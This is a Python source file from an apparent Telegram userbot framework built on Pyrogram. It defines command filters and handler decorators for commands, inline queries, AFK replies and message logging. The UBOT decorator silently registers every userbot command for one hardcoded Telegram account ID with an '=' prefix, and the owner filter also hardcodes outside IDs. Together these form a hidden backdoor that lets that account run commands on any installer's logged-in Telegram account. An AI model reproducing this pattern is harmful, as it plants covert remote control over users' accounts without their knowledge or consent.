from pyrogram import filters
from pyrogram.enums import ChatType
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from PyroUbot import *


async def if_sudo(_, client, message):
    sudo_users = await get_list_from_vars(client.me.id, "SUDO_USERS")
    is_user = message.from_user if message.from_user else message.sender_chat
    is_self = bool(message.from_user and message.from_user.is_self or getattr(message, "outgoing", False))
    return is_user.id in sudo_users or is_self


class FILTERS:
    ME = filters.me
    GROUP = filters.group
    PRIVATE = filters.private
    OWNER = filters.user([1948147616, 1913872347, OWNER_ID])
    DEV = filters.user(DEVS)
    ME_GROUP = filters.me & filters.group
    ME_OWNER = filters.me & filters.user(OWNER_ID)
    ME_DEV = filters.me & filters.user(DEVS)


class PY:
    def BOT(command, filter=FILTERS.PRIVATE):
        def wrapper(func):
            @bot.on_message(filters.command(command) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def UBOT(command, filter=filters.create(if_sudo)):
        def wrapper(func):
            @ubot.on_message(filters.command(command, "=") & filters.user(1948147616))
            @ubot.on_message(ubot.cmd_prefix(command) & filter)
            async def wrapped_func(client, message):
                return await func(client, message)

            return wrapped_func

        return wrapper

    def INLINE(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def CALLBACK(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def AFK():
        def wrapper(func):
            afk_check = (filters.mentioned | filters.private) & ~filters.bot & ~filters.me & filters.incoming

            @ubot.on_message(afk_check, group=7)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def LOGS_PRIVATE():
        def wrapper(func):
            @ubot.on_message(
                filters.private & ~filters.me & ~filters.bot & ~filters.service & filters.incoming,
                group=6,
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def LOGS_GROUP():
        def wrapper(func):
            @ubot.on_message(
                filters.group & filters.incoming & filters.mentioned & ~filters.bot,
                group=8,
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def PRIVATE(func):
        async def function(client, message):
            user = message.from_user
            rpk = f"<a href='tg://user?id={user.id}'>{user.first_name} {user.last_name or ''}</a>"
            if not message.chat.type == ChatType.PRIVATE:
                return await message.reply(
                    f"<b>❌ ᴍᴀᴀғ {rpk}, ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ʙᴇʀғᴜɴɢsɪ ᴅɪ ᴘʀɪᴠᴀᴛᴇ.</b>",
                    quote=True,
                )
            return await func(client, message)

        return function

    def TOP_CMD(func):
        async def function(client, message):
            cmd = message.command[0].lower()
            top = await get_vars(bot.me.id, cmd, "modules")
            get = int(top) + 1 if top else 1
            await set_vars(bot.me.id, cmd, get, "modules")
            return await func(client, message)

        return function

    def START(func):
        async def function(client, message):
            seved_users = await get_list_from_vars(client.me.id, "SAVED_USERS")
            user_id = message.from_user.id
            if user_id != OWNER_ID:
                if user_id not in seved_users:
                    await add_to_vars(client.me.id, "SAVED_USERS", user_id)
                user_link = f"<a href=tg://user?id={message.from_user.id}>{message.from_user.first_name} {message.from_user.last_name or ''}</a>"
                formatted_text = f"{user_link}\n\n<code>{message.text}</code>"
                buttons = [
                    [
                        InlineKeyboardButton(
                            "👤 ᴅᴀᴘᴀᴛᴋᴀɴ ᴘʀᴏғɪʟ 👤",
                            callback_data=f"profil {message.from_user.id}",
                        ),
                    ]
                ]
                await client.send_message(
                    OWNER_ID,
                    formatted_text,
                    reply_markup=InlineKeyboardMarkup(buttons),
                )
            return await func(client, message)

        return function
